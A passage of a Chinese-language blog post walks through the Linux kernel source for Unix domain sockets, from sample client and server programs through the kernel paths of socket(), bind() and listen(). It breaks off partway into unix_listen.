[{"content":"Unix Domain Socket源码实现分析(OLK 6.6) 对于正常的uds通信的创建一般分为两个部分：server和client，我们分别从server和client构建代码的关键函数来分析uds的源码实现\nserver实现代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 // Server code (server.c) #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;sys/un.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #define SOCKET_PATH \u0026#34;unix_socket\u0026#34; #define BUFFER_SIZE 100 int main() { int server_sock, client_sock; struct sockaddr_un server_addr; char buffer[BUFFER_SIZE]; // Create socket if ((server_sock = socket(AF_UNIX, SOCK_STREAM, 0)) == -1) { perror(\u0026#34;socket error\u0026#34;); exit(1); } // Set server address structure memset(\u0026amp;server_addr, 0, sizeof(server_addr)); server_addr.sun_family = AF_UNIX; strncpy(server_addr.sun_path, SOCKET_PATH, sizeof(server_addr.sun_path) - 1); // Bind the socket to the address unlink(SOCKET_PATH); if (bind(server_sock, (struct sockaddr*)\u0026amp;server_addr, sizeof(server_addr)) == -1) { perror(\u0026#34;bind error\u0026#34;); close(server_sock); exit(1); } // Listen for incoming connections if (listen(server_sock, 5) == -1) { perror(\u0026#34;listen error\u0026#34;); close(server_sock); exit(1); } printf(\u0026#34;Server is listening on %s\\n\u0026#34;, SOCKET_PATH); // Accept a client connection if ((client_sock = accept(server_sock, NULL, NULL)) == -1) { perror(\u0026#34;accept error\u0026#34;); close(server_sock); exit(1); } // Receive data from the client int bytes_received = read(client_sock, buffer, BUFFER_SIZE); if (bytes_received \u0026gt; 0) { buffer[bytes_received] = \u0026#39;\\0\u0026#39;; printf(\u0026#34;Received from client: %s\\n\u0026#34;, buffer); } // Send a response to the client const char* response = \u0026#34;Message received\u0026#34;; write(client_sock, response, strlen(response)); // Clean up close(client_sock); close(server_sock); unlink(SOCKET_PATH); return 0; } client实现代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 // Client code (client.c) #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;sys/un.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #define SOCKET_PATH \u0026#34;unix_socket\u0026#34; int main() { int client_sock; struct sockaddr_un server_addr; // Create socket if ((client_sock = socket(AF_UNIX, SOCK_STREAM, 0)) == -1) { perror(\u0026#34;socket error\u0026#34;); exit(1); } // Set server address structure memset(\u0026amp;server_addr, 0, sizeof(server_addr)); server_addr.sun_family = AF_UNIX; strncpy(server_addr.sun_path, SOCKET_PATH, sizeof(server_addr.sun_path) - 1); // Connect to the server if (connect(client_sock, (struct sockaddr*)\u0026amp;server_addr, sizeof(server_addr)) == -1) { perror(\u0026#34;connect error\u0026#34;); close(client_sock); exit(1); } // Send data to the server const char* message = \u0026#34;Hello, server!\u0026#34;; write(client_sock, message, strlen(message)); // Receive response from the server char buffer[100]; int bytes_received = read(client_sock, buffer, sizeof(buffer) - 1); if (bytes_received \u0026gt; 0) { buffer[bytes_received] = \u0026#39;\\0\u0026#39;; printf(\u0026#34;Received from server: %s\\n\u0026#34;, buffer); } // Clean up close(client_sock); return 0; } 通信流程如下：\n源码分析结构图如下：\nunix域套接字地址结构\n1 2 3 4 5 6 7 8 //include/uapi/linux/un.h #define UNIX_PATH_MAX 108 struct sockaddr_un { __kernel_sa_family_t sun_family; /* AF_UNIX */ char sun_path[UNIX_PATH_MAX]; /* pathname */ }; socket() 一句话概括socket函数：创建并初始化套接字，创建文件描述符并关联。\n1 2 3 4 5 //syscall系统调用 SYSCALL_DEFINE3(socket, int, family, int, type, int, protocol) { return __sys_socket(family, type, protocol); } socket()-\u0026gt;__sys_socket()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 //__sys_socket通过调用__sys_socket_create函数返回sock对象，最后通过sock_map_fd函数将对象转化为文件描述符。 int __sys_socket(int family, int type, int protocol) { struct socket *sock; int flags; sock = __sys_socket_create(family, type, update_socket_protocol(family, type, protocol)); if (IS_ERR(sock)) return PTR_ERR(sock); flags = type \u0026amp; ~SOCK_TYPE_MASK; if (SOCK_NONBLOCK != O_NONBLOCK \u0026amp;\u0026amp; (flags \u0026amp; SOCK_NONBLOCK)) flags = (flags \u0026amp; ~SOCK_NONBLOCK) | O_NONBLOCK; return sock_map_fd(sock, flags \u0026amp; (O_CLOEXEC | O_NONBLOCK)); } 套接字的创建由__sys_socket_create完成，sock_map_fd分配一个文件描述符，然后为套接字分配文件对象，最后将两者关联起来。\nsock_map_fd()将sock结构映射为文件描述符\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 static int sock_map_fd(struct socket *sock, int flags) { struct file *newfile; //获取可用文件描述符 int fd = get_unused_fd_flags(flags); if (unlikely(fd \u0026lt; 0)) { sock_release(sock); return fd; } //调用 sock_alloc_file() 为套接字分配一个文件对象 (struct file)。 newfile = sock_alloc_file(sock, flags, NULL); //如果分配成功，调用 fd_install(fd, newfile) 将文件对象与文件描述符 (fd) 关联起来，并返回该文件描述符。 if (!IS_ERR(newfile)) { fd_install(fd, newfile); return fd; } put_unused_fd(fd); return PTR_ERR(newfile); } sock_map_fd()-\u0026gt;sock_alloc_file()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 struct file *sock_alloc_file(struct socket *sock, int flags, const char *dname) { struct file *file; if (!dname) dname = sock-\u0026gt;sk ? sock-\u0026gt;sk-\u0026gt;sk_prot_creator-\u0026gt;name : \u0026#34;\u0026#34;; //分配伪文件 (alloc_file_pseudo)： file = alloc_file_pseudo(SOCK_INODE(sock), sock_mnt, dname, O_RDWR | (flags \u0026amp; O_NONBLOCK), \u0026amp;socket_file_ops); if (IS_ERR(file)) { sock_release(sock); return file; } //文件对象初始化 file-\u0026gt;f_mode |= FMODE_NOWAIT; sock-\u0026gt;file = file; file-\u0026gt;private_data = sock; stream_open(SOCK_INODE(sock), file); return file; } EXPORT_SYMBOL(sock_alloc_file); __sys_socket()-\u0026gt;__sys_socket_create()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 //__sys_socket_create调用sock_create创建socket static struct socket *__sys_socket_create(int family, int type, int protocol) { struct socket *sock; int retval; /* Check the SOCK_* constants for consistency. */ BUILD_BUG_ON(SOCK_CLOEXEC != O_CLOEXEC); BUILD_BUG_ON((SOCK_MAX | SOCK_TYPE_MASK) != SOCK_TYPE_MASK); BUILD_BUG_ON(SOCK_CLOEXEC \u0026amp; SOCK_TYPE_MASK); BUILD_BUG_ON(SOCK_NONBLOCK \u0026amp; SOCK_TYPE_MASK); if ((type \u0026amp; ~SOCK_TYPE_MASK) \u0026amp; ~(SOCK_CLOEXEC | SOCK_NONBLOCK)) return ERR_PTR(-EINVAL); type \u0026amp;= SOCK_TYPE_MASK; retval = sock_create(family, type, protocol, \u0026amp;sock); if (retval \u0026lt; 0) return ERR_PTR(retval); return sock; } __sys_socket_create()-\u0026gt;sock_create()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 //sock_create调用__sock_create /** *\tsock_create - creates a socket *\t@family: protocol family (AF_INET, ...) *\t@type: communication type (SOCK_STREAM, ...) *\t@protocol: protocol (0, ...) *\t@res: new socket * *\tA wrapper around __sock_create(). *\tReturns 0 or an error. This function internally uses GFP_KERNEL. */ int sock_create(int family, int type, int protocol, struct socket **res) { return __sock_create(current-\u0026gt;nsproxy-\u0026gt;net_ns, family, type, protocol, res, 0); } //EXPORT_SYMBOL() 是一个内核宏，用于将符号（函数或变量）导出到内核的符号表中，以便该函数可以被其他内核模块使用。 EXPORT_SYMBOL(sock_create); __sock_create-\u0026gt;unix_create()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 /** *\t__sock_create - creates a socket *\t@net: net namespace *\t@family: protocol family (AF_INET, ...) *\t@type: communication type (SOCK_STREAM, ...) *\t@protocol: protocol (0, ...) *\t@res: new socket *\t@kern: boolean for kernel space sockets * *\tCreates a new socket and assigns it to @res, passing through LSM. *\tReturns 0 or an error. On failure @res is set to %NULL. @kern must *\tbe set to true if the socket resides in kernel space. *\tThis function internally uses GFP_KERNEL. */ int __sock_create(struct net *net, int family, int type, int protocol, struct socket **res, int kern) { int err; struct socket *sock; const struct net_proto_family *pf; ... //Check if creating a new socket is allowed err = security_socket_create(family, type, protocol, kern); /* *\tAllocate the socket and allow the family to set things up. if *\tthe protocol is 0, the family is instructed to select an appropriate *\tdefault. */ sock = sock_alloc(); if (!sock) { net_warn_ratelimited(\u0026#34;socket: no more sockets\\n\u0026#34;); return -ENFILE;\t/* Not exactly a match, but its the closest posix thing */ } ... pf = rcu_dereference(net_families[family]); /* * We will call the -\u0026gt;create function, that possibly is in a loadable * module, so we have to bump that loadable module refcnt first. */ err = pf-\u0026gt;create(net, sock, protocol, kern); ... EXPORT_SYMBOL(__sock_create); sock_create() 函数首先调用security_socket_create 检查是否有权限创建新的socket文件，接着调用sock_alloc() 申请一个 struct socket 结构，然后调用指定协议族的 create() 函数（net_families[family]-\u0026gt;create()）进行进一步的创建功能。net_families 变量的类型为 struct net_proto_family，其定义如下：\n1 2 3 4 5 struct net_proto_family { int family; int (*create)(struct socket *sock, int protocol); ... }; family 字段对应的就是具体的协议族，而 create 字段指定了其创建socket的方法。一个具体协议族需要通过调用 sock_register() 函数向系统注册其创建socket的方法。例如 Unix socket 就在初始化时通过下面的代码注册：\n1 2 3 4 5 6 7 8 9 10 11 12 13 static const struct net_proto_family unix_family_ops = { .family = PF_UNIX, .create = unix_create, .owner\t= THIS_MODULE, }; static int __init af_unix_init(void) { ... sock_register(\u0026amp;unix_family_ops); ... return 0; } 所以从上面的代码可以指定，对于 Unix socket 的话，net_families[family]-\u0026gt;create() 这行代码实际调用的是 unix_create() 函数。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 //unix_create初始化套接字并根据类型调用合适的处理函数，同时调用unix_create1函数创建socket。 static int unix_create(struct net *net, struct socket *sock, int protocol, int kern) { struct sock *sk; //将套接字状态设置为未连接。 sock-\u0026gt;state = SS_UNCONNECTED; //根据套接字类型设置操作： switch (sock-\u0026gt;type) { case SOCK_STREAM: sock-\u0026gt;ops = \u0026amp;unix_stream_ops; break; /* *\tBelieve it or not BSD has AF_UNIX, SOCK_RAW though *\tnothing uses it. */ case SOCK_RAW: sock-\u0026gt;type = SOCK_DGRAM; fallthrough; case SOCK_DGRAM: sock-\u0026gt;ops = \u0026amp;unix_dgram_ops; break; case SOCK_SEQPACKET: sock-\u0026gt;ops = \u0026amp;unix_seqpacket_ops; break; default: return -ESOCKTNOSUPPORT; } sk = unix_create1(net, sock, kern, sock-\u0026gt;type); if (IS_ERR(sk)) return PTR_ERR(sk); return 0; } unix_create()-\u0026gt;unix_create1()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 //分配资源和初始化各种内部数据结构。 static struct sock *unix_create1(struct net *net, struct socket *sock, int kern, int type) { struct unix_sock *u; struct sock *sk; int err; ... //根据套接字类型 (SOCK_STREAM, SOCK_DGRAM 或 SOCK_SEQPACKET)，调用 sk_alloc() 分配一个新的 sock 对象。 if (type == SOCK_STREAM) sk = sk_alloc(net, PF_UNIX, GFP_KERNEL, \u0026amp;unix_stream_proto, kern); else /*dgram and seqpacket */ sk = sk_alloc(net, PF_UNIX, GFP_KERNEL, \u0026amp;unix_dgram_proto, kern); ... //将套接字 sock 与sock对象 sk 相关联，初始化数据结构。 sock_init_data(sock, sk); //初始化 sk 结构的成员 sk-\u0026gt;sk_hash\t= unix_unbound_hash(sk); sk-\u0026gt;sk_allocation\t= GFP_KERNEL_ACCOUNT; sk-\u0026gt;sk_write_space\t= unix_write_space; sk-\u0026gt;sk_max_ack_backlog\t= net-\u0026gt;unx.sysctl_max_dgram_qlen; sk-\u0026gt;sk_destruct\t= unix_sock_destructor; u\t= unix_sk(sk); u-\u0026gt;path.dentry = NULL; u-\u0026gt;path.mnt = NULL; ... return sk; struct socket 是 Linux 网络栈中表示一个套接字的核心结构，通常用于与用户空间应用程序进行交互。sock 是用户空间程序与内核中的网络栈通信的接口，代表了一个网络端点，用于建立连接、发送/接收数据等操作\nunix_sock 是一个在 Linux 内核中与 Unix 域套接字相关的私有数据结构。它扩展了 struct sock，用于存储与 Unix 域套接字相关的特定数据。\nbind() 一句话概括bind函数：将uds地址绑定到套接字\n1 2 3 4 5 //syscall系统调用 SYSCALL_DEFINE3(bind, int, fd, struct sockaddr __user *, umyaddr, int, addrlen) { return __sys_bind(fd, umyaddr, addrlen); } bind()-\u0026gt;__sys_bind()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 int __sys_bind(int fd, struct sockaddr __user *umyaddr, int addrlen) { struct socket *sock; struct sockaddr_storage address; int err, fput_needed; //查找套接字 sock = sockfd_lookup_light(fd, \u0026amp;err, \u0026amp;fput_needed); if (sock) { //将用户空间地址移动到内核空间 err = move_addr_to_kernel(umyaddr, addrlen, \u0026amp;address); if (!err) { //安全检查(权限) err = security_socket_bind(sock, (struct sockaddr *)\u0026amp;address, addrlen); if (!err) //执行具体协议实现的bind函数 err = READ_ONCE(sock-\u0026gt;ops)-\u0026gt;bind(sock, (struct sockaddr *) \u0026amp;address, addrlen); } fput_light(sock-\u0026gt;file, fput_needed); } return err; } __sys_bind()-\u0026gt;unix_bind()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 static int unix_bind(struct socket *sock, struct sockaddr *uaddr, int addr_len) { struct sockaddr_un *sunaddr = (struct sockaddr_un *)uaddr; // 将通用地址结构转换为UNIX专用的地址结构 struct sock *sk = sock-\u0026gt;sk; // 获取套接字的基础结构 int err; // 用于存储错误码 // 当 sun_path 为空时，unix_autobind() 会为套接字自动生成一个唯一的、临时的地址，通常在内核中创建一个临时文件来表示该套接字的地址。 if (addr_len == offsetof(struct sockaddr_un, sun_path) \u0026amp;\u0026amp; sunaddr-\u0026gt;sun_family == AF_UNIX) return unix_autobind(sk); // 验证地址是否合法 err = unix_validate_addr(sunaddr, addr_len); if (err) return err; // 根据sun_path的第一个字符决定调用哪个绑定函数 if (sunaddr-\u0026gt;sun_path[0]) err = unix_bind_bsd(sk, sunaddr, addr_len); // 调用BSD风格地址绑定函数 else err = unix_bind_abstract(sk, sunaddr, addr_len); // 调用抽象地址绑定函数 return err; } 这里涉及到了三种不同的bind函数调用，自动绑定(unix_autobind)、BSD 风格 (unix_bind_bsd()) 和抽象风格 (unix_bind_abstract())\nBSD 风格绑定 (unix_bind_bsd()) 路径地址绑定：BSD 风格的 UNIX domain socket 使用文件系统中的路径作为地址。例如：/tmp/mysocket，即 sun_path 的第一个字符是 /，表示它是一个标准的路径。 文件系统依赖：BSD 风格的地址实际上是文件系统中的一个路径，因此它需要在文件系统中创建一个对应的文件节点，这样其他进程就可以通过访问这个文件节点来与该套接字通信。 持久性：由于是基于文件系统的路径，BSD 风格的 UNIX socket 地址在程序退出后文件仍然存在，因此需要显式地删除路径（即使用 unlink()），否则下次绑定同样的路径可能会失败。 抽象风格绑定 (unix_bind_abstract()) 不依赖于文件系统：抽象风格的 UNIX domain socket 地址不是基于文件系统的路径，而是由一个以 NUL（空字符，'\\0'）开头的字符串作为地址。因为这个地址不是文件路径，所以它不依赖文件系统，适合在某些情况下避免文件系统的复杂性或开销。 仅在内核中存在：抽象地址的作用域仅限于内核内部，它不需要在文件系统中创建节点，因此完全由内核管理。这样可以减少对磁盘的依赖，同时在某些系统（如没有持久存储的嵌入式系统）中也很有用。 临时性：抽象地址的生命周期与绑定该地址的进程的生命周期相同，当进程结束时，抽象地址也随之释放。它不需要像 BSD 风格那样手动删除路径。 BSD 风格提供了一种基于文件系统的地址绑定方式，具有持久性和文件权限管理的优点，适合需要长期通信和文件权限控制的应用场景。\n抽象风格则提供了一种内核管理的轻量化地址绑定方式，避免了文件系统的依赖，更适合临时性通信，减少了资源占用和管理开销。\n第一种:unix_bind()-\u0026gt;unix_autobind()\nunix_autobind() 是一个用于自动为套接字分配地址的函数，适用于 UNIX domain socket 没有提供具体绑定地址的情况。当用户调用 bind() 但是没有指定地址时，unix_autobind() 会被调用，它会为套接字生成一个唯一的、临时的抽象地址。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 static int unix_autobind(struct sock *sk) { unsigned int new_hash, old_hash = sk-\u0026gt;sk_hash; struct unix_sock *u = unix_sk(sk); struct net *net = sock_net(sk); struct unix_address *addr; u32 lastnum, ordernum; //ordernum 和 lastnum：用于生成唯一的抽象地址。 int err; err = mutex_lock_interruptible(\u0026amp;u-\u0026gt;bindlock); if (err) return err; if (u-\u0026gt;addr) goto out; err = -ENOMEM; // 使用 kzalloc() 为 unix_address 结构分配内存，包含了地址结构和 sun_path 的存储空间。如果内存分配失败，返回 -ENOMEM。使用 kzalloc() 为 unix_address 结构分配内存，包含了地址结构和 sun_path 的存储空间。如果内存分配失败，返回 -ENOMEM。 addr = kzalloc(sizeof(*addr) + offsetof(struct sockaddr_un, sun_path) + 16, GFP_KERNEL); if (!addr) goto out; addr-\u0026gt;len = offsetof(struct sockaddr_un, sun_path) + 6; addr-\u0026gt;name-\u0026gt;sun_family = AF_UNIX; refcount_set(\u0026amp;addr-\u0026gt;refcnt, 1); // 使用 get_random_u32() 获取一个随机数，用于生成唯一的抽象地址。 ordernum = get_random_u32(); // lastnum 保存了随机数的低 20 位，用于限制循环次数，确保不会无限循环。 lastnum = ordernum \u0026amp; 0xFFFFF; retry: // 生成和检查地址唯一性 (retry)： ordernum = (ordernum + 1) \u0026amp; 0xFFFFF; sprintf(addr-\u0026gt;name-\u0026gt;sun_path + 1, \u0026#34;%05x\u0026#34;, ordernum); new_hash = unix_abstract_hash(addr-\u0026gt;name, addr-\u0026gt;len, sk-\u0026gt;sk_type); unix_table_double_lock(net, old_hash, new_hash); // 检查地址是否已存在 if (__unix_find_socket_byname(net, addr-\u0026gt;name, addr-\u0026gt;len, new_hash)) { unix_table_double_unlock(net, old_hash, new_hash); /* __unix_find_socket_byname() may take long time if many names * are already in use. */ //如果地址已存在，解锁哈希表，并调用 cond_resched() 让出 CPU 资源，然后继续生成新的地址（跳转到 retry 标签）。如果所有地址都已用尽，返回 -ENOSPC，表示没有空间可用。 cond_resched(); if (ordernum == lastnum) { /* Give up if all names seems to be in use. */ err = -ENOSPC; unix_release_addr(addr); goto out; } goto retry; } // __unix_set_addr_hash() 将生成的地址设置到套接字中，并更新哈希表。 __unix_set_addr_hash(net, sk, addr, new_hash); unix_table_double_unlock(net, old_hash, new_hash); err = 0; out:\tmutex_unlock(\u0026amp;u-\u0026gt;bindlock); return err; } 第二种：unix_bind()-\u0026gt;unix_bind_abstract()\nunix_bind_abstract() 是一个用于将 UNIX domain socket 地址绑定到套接字的内核函数，专门用于抽象风格地址（即不依赖于文件系统的地址）。这个函数负责确保套接字被绑定到一个唯一的抽象地址，并对地址进行哈希和注册处理。以下是对该函数的详细分析。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 static int unix_bind_abstract(struct sock *sk, struct sockaddr_un *sunaddr, int addr_len) { unsigned int new_hash, old_hash = sk-\u0026gt;sk_hash; struct unix_sock *u = unix_sk(sk); struct net *net = sock_net(sk); struct unix_address *addr; int err; // 创建UNIX地址,为抽象地址分配内存，并将用户提供的地址数据（sunaddr）转换为内核使用的地址结构。 addr = unix_create_addr(sunaddr, addr_len); //使用 unix_abstract_hash() 计算新地址的哈希值，用于将抽象地址放入内核中的哈希表进行管理。 new_hash = unix_abstract_hash(addr-\u0026gt;name, addr-\u0026gt;len, sk-\u0026gt;sk_type); //__unix_set_addr_hash() 设置新的绑定地址，并将其插入哈希表中，以便后续可以通过地址快速找到对应的套接字。 __unix_set_addr_hash(net, sk, addr, new_hash); return 0; } 第三种：unix_bind()-\u0026gt;unix_bind_bsd()\nunix_bind_bsd() 是内核中用于将 BSD 风格的 UNIX domain socket 地址绑定到套接字的函数。它实现了将套接字地址绑定到文件系统路径的逻辑，并确保地址唯一性和相应的文件系统操作。以下是对这个函数的详细分析。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 static int unix_bind_bsd(struct sock *sk, struct sockaddr_un *sunaddr, int addr_len) { umode_t mode = S_IFSOCK | // 设置文件模式为套接字 (SOCK_INODE(sk-\u0026gt;sk_socket)-\u0026gt;i_mode \u0026amp; ~current_umask()); // 根据套接字的模式和当前掩码计算文件模式 unsigned int new_hash, old_hash = sk-\u0026gt;sk_hash; // 新旧哈希值 struct unix_sock *u = unix_sk(sk); // 获取UNIX套接字结构体 struct net *net = sock_net(sk); // 获取套接字关联的网络命名空间 struct mnt_idmap *idmap; // ID映射 struct unix_address *addr; // UNIX地址结构 struct dentry *dentry; // 目录项 struct path parent; // 父目录路径 int err; // 错误码 // 对传入的地址进行处理，确保其格式正确，并计算所需的地址长度。 addr_len = unix_mkname_bsd(sunaddr, addr_len); // unix_create_addr()：为套接字地址分配内存，将传入的地址数据存储在新创建的 unix_address 结构中。如果分配失败，返回 -ENOMEM。 addr = unix_create_addr(sunaddr, addr_len); if (!addr) return -ENOMEM; // 内存分配失败 // kern_path_create()：查找或创建对应路径的目录项 (dentry)，获取地址所在路径的父目录 (parent)。 dentry = kern_path_create(AT_FDCWD, addr-\u0026gt;name-\u0026gt;sun_path, \u0026amp;parent, 0); if (IS_ERR(dentry)) { // 处理错误 err = PTR_ERR(dentry); goto out; } // 在文件系统中创建套接字节点 idmap = mnt_idmap(parent.mnt); // 获取ID映射 err = security_path_mknod(\u0026amp;parent, dentry, mode, 0); // 首先进行安全检查，确保当前进程有权限在指定路径创建节点。 if (!err) err = vfs_mknod(idmap, d_inode(parent.dentry), dentry, mode, 0); // 在文件系统中创建节点，用于表示该 UNIX domain socket。 err = mutex_lock_interruptible(\u0026amp;u-\u0026gt;bindlock); // 锁定互斥量 new_hash = unix_bsd_hash(d_backing_inode(dentry)); // 创建哈希值 unix_table_double_lock(net, old_hash, new_hash); // 锁定双向哈希表 u-\u0026gt;path.mnt = mntget(parent.mnt); // 设置路径 u-\u0026gt;path.dentry = dget(dentry); // 设置目录项 __unix_set_addr_hash(net, sk, addr, new_hash); // 设置地址哈希 unix_table_double_unlock(net, old_hash, new_hash); // 解锁双向哈希表 unix_insert_bsd_socket(sk); // unix_insert_bsd_socket()：将该套接字插入到 BSD 风格套接字的管理结构中。 mutex_unlock(\u0026amp;u-\u0026gt;bindlock); // 解锁互斥量 done_path_create(\u0026amp;parent, dentry); return 0;\tvfs_mknod()\nvfs_mknod() 是内核中的一个函数，用于在文件系统中创建设备节点或普通文件。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 int vfs_mknod(struct mnt_idmap *idmap, struct inode *dir, struct dentry *dentry, umode_t mode, dev_t dev) { // is_whiteout：检查创建的节点是否为“whiteout”设备节点（特定场景下表示覆盖的字符设备节点）。这是一个特殊类型，用于某些文件系统操作，比如在 overlay 文件系统中。 bool is_whiteout = S_ISCHR(mode) \u0026amp;\u0026amp; dev == WHITEOUT_DEV; // may_create()：检查是否有权限在父目录中创建新文件或设备节点。如果没有权限，则直接返回错误。 int error = may_create(idmap, dir, dentry); if (error) return error; //S_ISCHR(mode) 和 S_ISBLK(mode)：判断所要创建的节点是否为字符设备或块设备。如果是字符设备或块设备节点，且不是 \u0026#34;whiteout\u0026#34;，则需要调用 capable(CAP_MKNOD) 来检查是否具有创建设备节点的权限（通常是超级用户权限）。如果没有权限，返回 -EPERM（操作不允许）。 if ((S_ISCHR(mode) || S_ISBLK(mode)) \u0026amp;\u0026amp; !is_whiteout \u0026amp;\u0026amp; !capable(CAP_MKNOD)) return -EPERM; // 检查父目录的 inode 操作 (i_op) 是否支持 mknod，即是否具有创建设备节点的功能。如果父目录不支持该操作，则返回 -EPERM。 if (!dir-\u0026gt;i_op-\u0026gt;mknod) return -EPERM; mode = vfs_prepare_mode(idmap, dir, mode, mode, mode); error = devcgroup_inode_mknod(mode, dev); if (error) return error; error = security_inode_mknod(dir, dentry, mode, dev); if (error) return error; // dir-\u0026gt;i_op-\u0026gt;mknod()：实际调用文件系统提供的 mknod 操作来创建设备节点。这个操作由具体的文件系统实现（如 EXT4、XFS 等）。 error = dir-\u0026gt;i_op-\u0026gt;mknod(idmap, dir, dentry, mode, dev); if (!error) fsnotify_create(dir, dentry); return error; } EXPORT_SYMBOL(vfs_mknod); 问题：所以sock文件到底是socket函数创建的还是bind函数创建的？\n答：sock 文件（即 UNIX domain socket 文件）实际上是在 bind() 函数的执行过程中创建的，而不是在调用 socket() 函数时创建的。\nsocket() 函数的作用 socket() 函数创建的是套接字的内核对象，返回一个文件描述符（fd），用于表示一个套接字。 当你调用 socket() 函数时，内核会为该套接字分配必要的内核结构体（例如 struct socket 和 struct sock），并初始化与该套接字相关的内核数据结构。 在这一步，虽然套接字的对象已经存在，但还没有与具体的文件系统路径进行关联。因此，这时候并没有产生任何文件系统中的节点（sock 文件）。 bind() 函数的作用 bind() 函数的作用是将套接字与一个具体的地址绑定。在 UNIX domain socket 的场景下，这个地址可以是一个文件系统中的路径，也可以是一个抽象名称。 对于 BSD 风格 的 UNIX domain socket，调用 bind() 函数时，会在文件系统中创建一个文件节点，这个节点就是我们在文件系统中看到的 .sock 文件，或者是类似 /tmp/mysocket 的文件。 具体来说，bind() 函数中会调用 vfs_mknod()，它在文件系统中创建一个新的文件节点（类型为 S_IFSOCK），并把这个节点与套接字相关联。这样，其他进程就可以通过该路径找到这个套接字，从而进行通信。 sock 文件的创建过程\n以下是 sock 文件创建的关键步骤：\n(1)调用 socket() 函数：\n创建套接字对象，并返回一个文件描述符，标识这个套接字。\n此时，内核中创建了套接字的相关数据结构，但文件系统中并没有任何体现。\n(2)调用 bind() 函数：\n将套接字与具体的地址绑定。对于 UNIX domain socket，这个地址是一个文件系统路径（BSD 风格）或抽象路径。 如果是 BSD 风格的地址，bind() 函数会在文件系统中为该地址创建一个文件节点。比如 /tmp/mysocket。 内核中会调用 vfs_mknod() 或类似的文件系统函数来创建设备节点，确保在文件系统中有一个对应的文件，表示该 UNIX domain socket 地址。 如果是抽象地址，则没有文件系统节点的创建，仅在内核中维护相应的抽象路径。 listen() 一句话概括listen函数：将套接字状态设置为监听模式。\n1 2 3 4 5 //syscall SYSCALL_DEFINE2(listen, int, fd, int, backlog) { return __sys_listen(fd, backlog); } listen()-\u0026gt;sys_listen()\n这段代码实现了内核中 listen() 系统调用的核心部分。它用于将一个套接字转换为被动连接模式，开始监听来自客户端的连接请求。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 int __sys_listen(int fd, int backlog) { struct socket *sock; int err, fput_needed; int somaxconn; //sockfd_lookup_light() 用于查找与给定文件描述符 fd 关联的套接字对象 (struct socket)。 sock = sockfd_lookup_light(fd, \u0026amp;err, \u0026amp;fput_needed); if (sock) { //设置最大连接数 (somaxconn) somaxconn = READ_ONCE(sock_net(sock-\u0026gt;sk)-\u0026gt;core.sysctl_somaxconn); if ((unsigned int)backlog \u0026gt; somaxconn) backlog = somaxconn; err = security_socket_listen(sock, backlog); if (!err) // 调用协议栈的 listen() 函数，将套接字转换为监听模式。 err = READ_ONCE(sock-\u0026gt;ops)-\u0026gt;listen(sock, backlog); // 释放文件引用： fput_light(sock-\u0026gt;file, fput_needed); } return err; } sys_listen()-\u0026gt;unix_listen()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 static int unix_listen(struct socket *sock, int backlog) { int err; // 错误码 struct sock *sk = sock-\u0026gt;sk; // 获取套接字的基础结构 struct unix_sock *u = unix_sk(sk); // 获取UNIX套接字结构 err = -EOPNOTSUPP; // 检查套接字类型是否为 SOCK_STREAM 或 SOCK_SEQPACKET if (sock-\u0026gt;type != SOCK_STREAM \u0026amp;\u0026amp; sock-\u0026gt;type != SOCK_SEQPACKET) // 仅有流套接字和顺序包套接字支持监听 goto out; err = -EINVAL; // 检查是否绑定地址，未绑定地址的套接字不能进行监听 if (!u-\u0026gt;addr) goto out; unix_state_lock(sk); // 锁定套接字状态 // 检查套接字状态是否为 TCP_CLOSE 或 TCP_LISTEN if (sk-\u0026gt;sk_state != TCP_CLOSE \u0026amp;\u0026amp; sk-\u0026gt;sk_state != TCP_LISTEN) goto out_unlock; // 套接字状态必须为关闭或监听 // 如果新的SYN等待队列大小大于当前的SYN最大等待队列大小，则唤醒所有SYN等待队列中的对等体 if (backlog \u0026gt; sk-\u0026gt;sk_max_ack_backlog) wake_up_interruptible_all(\u0026amp;u-\u0026gt;peer_wait); 